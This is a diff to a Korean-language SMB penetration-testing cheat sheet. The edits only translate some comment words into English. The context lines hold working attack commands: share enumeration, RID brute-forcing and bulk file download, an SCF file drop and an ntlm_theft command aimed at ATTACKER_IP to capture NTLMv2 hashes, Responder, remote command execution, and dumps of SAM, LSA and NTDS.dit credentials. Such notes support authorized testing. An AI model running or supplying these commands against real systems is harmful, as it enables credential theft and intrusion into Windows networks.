@@ -44,7 +44,7 @@ smbmap -H TARGET -u user -p pass -d DOMAIN
 # 사용자/그룹 열거 (RID Brute)
 nxc smb TARGET -u user -p pass --rid-brute
 
-# 특정 공유 접근 및 파일 다운로드
+# 특정 공유 접근 및 파일 download
 smbclient //TARGET/SHARE -U 'DOMAIN\user%pass'
 smb: \> get filename
 smb: \> mget *
@@ -56,7 +56,7 @@ smb: \> put localfile
 ```bash
 smb: \> recurse ON        # 하위 directory 포함
 smb: \> prompt OFF        # 확인 프롬프트 비활성화
-smb: \> mget *            # 모든 파일 다운로드
+smb: \> mget *            # 모든 파일 download
 smb: \> allinfo filename  # 파일 상세 정보
 smb: \> showacls          # ACL 표시 모드
 ```
@@ -110,8 +110,8 @@ nxc smb TARGET -u user -p pass -M gpp_autologin
 # 쓰기 권한 확인
 smbmap -H TARGET -u user -p pass
 
-# SCF 파일 드롭 (NTLMv2 해시 캡처)
-# 쓰기 가능한 공유에 SCF 파일 배치 → 사용자가 폴더 열면 해시 전송
+# SCF 파일 드롭 (NTLMv2 hash capture)
+# 쓰기 가능한 공유에 SCF 파일 배치 → 사용자가 폴더 열면 hash 전송
 cat > attack.scf << 'EOF'
 [Shell]
 Command=2
@@ -132,7 +132,7 @@ EOF
 # .lnk 파일은 ntlm_theft 사용
 ntlm_theft -g lnk -s ATTACKER_IP -f malicious
 
-# Responder로 해시 캡처
+# Responder로 hash capture
 sudo responder -I eth0
 ```
 
@@ -151,19 +151,19 @@ nxc smb TARGET -u admin -p pass -x "whoami"
 nxc smb TARGET -u admin -p pass -X "Get-Process"  # PowerShell
 ```
 
-### credential 덤프
+### credential dump
 
 ```bash
-# SAM 덤프 (로컬 계정 해시)
+# SAM dump (로컬 계정 hash)
 nxc smb TARGET -u admin -p pass --sam
 
-# LSA 덤프 (캐시된 credential)
+# LSA dump (캐시된 credential)
 nxc smb TARGET -u admin -p pass --lsa
 
-# NTDS.dit 덤프 (DC에서만, 모든 도메인 계정)
+# NTDS.dit dump (DC에서만, 모든 도메인 계정)
 nxc smb DC_IP -u admin -p pass --ntds
 
-# reg.py로 원격 레지스트리
+# reg.py로 원격 Registry
 impacket-reg DOMAIN/user:pass@TARGET query -keyName "HKLM\SAM" -s
 ```
 
